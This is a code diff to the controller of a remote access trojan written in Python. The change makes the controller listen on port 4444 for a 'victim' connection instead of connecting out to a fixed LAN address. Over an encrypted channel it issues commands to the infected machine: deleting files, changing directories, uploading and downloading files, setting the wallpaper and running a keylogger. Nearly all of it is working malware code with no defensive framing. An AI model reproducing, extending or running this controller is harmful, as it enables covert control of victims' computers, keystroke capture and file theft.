@@ -4,18 +4,21 @@ import time
 from cryptography.fernet import Fernet
 
 class EncryptedClient:
-    def __init__(self, server_ip: str, port: int):
-        self.server_ip = server_ip
-        self.port = port
+    def __init__(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.cipher = None
         self.operating_system = None
+        self.conn = None
 
-    def connect(self):
-        self.sock.connect((self.server_ip, self.port))
-        key = self.sock.recv(1024)
+    def Start_server(self):
+        self.sock.bind(("0.0.0.0", 4444))
+        self.sock.listen(1)
+        print("[*] Listening for Connections ...")
+        self.conn, addr = self.sock.accept()
+        print(f"[*] Connection from {addr}")
+        key = self.conn.recv(1024)
         self.cipher = Fernet(key)
-        self.operating_system = self.sock.recv(1024).decode()
+        self.operating_system = self.conn.recv(1024).decode()
         print(f"Victim's OS => {self.operating_system}")
 
     def encrypt(self, data: bytes) -> bytes:
@@ -28,28 +31,28 @@ class EncryptedClient:
         return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
 
     def authenticate(self):
-        print(self.decrypt(self.sock.recv(1024)).decode(), end="")
-        self.sock.send(self.encrypt(input().encode()))
-        print(self.decrypt(self.sock.recv(1024)).decode(), end="")
-        self.sock.send(self.encrypt(input().encode()))
+        print(self.decrypt(self.conn.recv(1024)).decode(), end="")
+        self.conn.send(self.encrypt(input().encode()))
+        print(self.decrypt(self.conn.recv(1024)).decode(), end="")
+        self.conn.send(self.encrypt(input().encode()))
 
-        result = self.decrypt(self.sock.recv(1024)).decode()
+        result = self.decrypt(self.conn.recv(1024)).decode()
         print(result)
         if "failed" in result:
-            self.sock.close()
+            self.conn.close()
             return False
         return True
 
     def send_command(self, command: str):
-        self.sock.sendall(self.encrypt(command.encode()))
+        self.conn.sendall(self.encrypt(command.encode()))
 
     def handle_response(self, command: str):
         if "del" in command:
-            print(self.decrypt(self.sock.recv(1024)).decode())
+            print(self.decrypt(self.conn.recv(1024)).decode())
 
         elif "keylogger" in command:
             while True:
-                data = self.decrypt(self.sock.recv(1024)).decode()
+                data = self.decrypt(self.conn.recv(1024)).decode()
                 if data != "Done":
                     print(data.strip())
                 else:
@@ -61,18 +64,18 @@ class EncryptedClient:
                 with open(file_name, "rb") as file:
                     content = self.encrypt(file.read())
                 chunks = self.to_chunks(content)
-                self.sock.send(self.encrypt(str(len(chunks)).encode()))
+                self.conn.send(self.encrypt(str(len(chunks)).encode()))
                 time.sleep(1)
                 for chunk in chunks:
-                    self.sock.sendall(chunk)
+                    self.conn.sendall(chunk)
             except FileNotFoundError:
-                self.sock.send(self.encrypt(b"Wrong file name"))
-            print(self.decrypt(self.sock.recv(1024)).decode())
+                self.conn.send(self.encrypt(b"Wrong file name"))
+            print(self.decrypt(self.conn.recv(1024)).decode())
 
         else:
-            num_chunks = int(self.decrypt(self.sock.recv(1024)).decode())
+            num_chunks = int(self.decrypt(self.conn.recv(1024)).decode())
             print(f"Chunks coming: {num_chunks}")
-            encrypted_data = b''.join(self.sock.recv(1024) for _ in range(num_chunks))
+            encrypted_data = b''.join(self.conn.recv(1024) for _ in range(num_chunks))
 
             if "download" in command:
                 file_name = command.split(" ")[1]
@@ -99,8 +102,10 @@ del [file], cd [path], download [file], upload [file], wall [img], keylogger [co
                     """)
                     continue
 
-                elif command.lower() == "exit":
+                elif (command.lower() == "exit") or (command.lower() == "close"):
+                    print("\n[!] Interrupted by user. Closing connection.")
                     self.send_command("close")
+                    self.conn.close()
                     break
 
                 self.send_command(command)
@@ -110,7 +115,7 @@ del [file], cd [path], download [file], upload [file], wall [img], keylogger [co
             print("\n[!] Interrupted by user. Closing connection.")
             self.send_command("close")
         finally:
-            self.sock.close()
+            self.conn.close()
 
 
 if __name__ == "__main__":
@@ -122,6 +127,6 @@ if __name__ == "__main__":
 ╚██████╗███████╗      ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
  ╚═════╝╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
 """)
-    client = EncryptedClient("192.168.50.200", 4444)
-    client.connect()
+    client = EncryptedClient()
+    client.Start_server()
     client.run()
